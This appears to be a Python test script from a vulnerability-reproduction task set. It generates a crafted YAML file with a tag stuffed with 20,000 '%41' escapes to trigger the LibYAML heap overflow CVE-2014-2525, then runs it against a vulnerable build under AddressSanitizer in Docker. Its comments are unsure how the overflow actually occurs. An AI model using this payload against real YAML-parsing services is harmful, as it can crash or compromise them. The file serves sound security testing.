import os
import subprocess
import time

def run_cmd(cmd, cwd=None):
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            check=False,
            cwd=cwd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            encoding='utf-8',
            errors='ignore'
        )
        return result
    except Exception as e:
        print(f"Error running command {cmd}: {e}")
        return None

def main():
    print("======================================================================")
    print("Manual Reproduction for CVE-2014-2525 (LibYAML Heap Overflow)")
    print("======================================================================")
    
    # 1. Create Malicious Seed (repro.yaml)
    # Payload: Huge sequences of %41 (A) inside a tag to trigger heap overflow in scan_uri_escapes
    print("\n[+] Generating malicious seed 'repro.yaml'...")
    
    # Structure: --- !<TAG_CONTENT> "foo"
    # We inject thousands of %41 into the tag content
    # The vulnerability is that the buffer doesn't expand for % sequences
    payload = "%41" * 20000  # 20k repeats * 3 chars = 60kB string. Buffer grows but fail check?
                             # Actually buffer overflow happens if it fails to extend.
    
    # Construct valid YAML with massive tag
    # !<...>
    seed_content = f"""%YAML 1.1
---
!<{payload}> "trigger"
"""
    
    seed_path = "tasks/CVE-2014-2525_libyaml/seeds/repro.yaml"
    os.makedirs(os.path.dirname(seed_path), exist_ok=True)
    with open(seed_path, "w") as f:
        f.write(seed_content)
    
    print(f"    Seed created at {seed_path} ({len(seed_content)} bytes)")

    # 2. Run against Vulnerable Version
    print("\n[+] Running against Vulnerable Version (0.1.5 + ASan)...")
    # Using docker compose run
    docker_cmd = "docker compose -f tasks/CVE-2014-2525_libyaml/compose.yml run --rm vuln /harness/run.sh /seeds/repro.yaml"
    
    res = run_cmd(docker_cmd)
    
    if res:
        print("\n--- STDOUT ---")
        print(res.stdout[:500]) # Print head
        print("\n--- STDERR ---")
        print(res.stderr) # Print all stderr to see ASan report
        
        if "AddressSanitizer" in res.stderr or "heap-buffer-overflow" in res.stderr:
            print("\n[SUCCESS] ASan detected Heap Buffer Overflow!")
        elif "Segmentation fault" in res.stderr or res.returncode == 139:
            print("\n[SUCCESS] Segmentation Fault detected!")
        else:
            print("\n[FAILURE] No crash detected.")
    else:
        print("Failed to run docker command.")

if __name__ == "__main__":
    main()
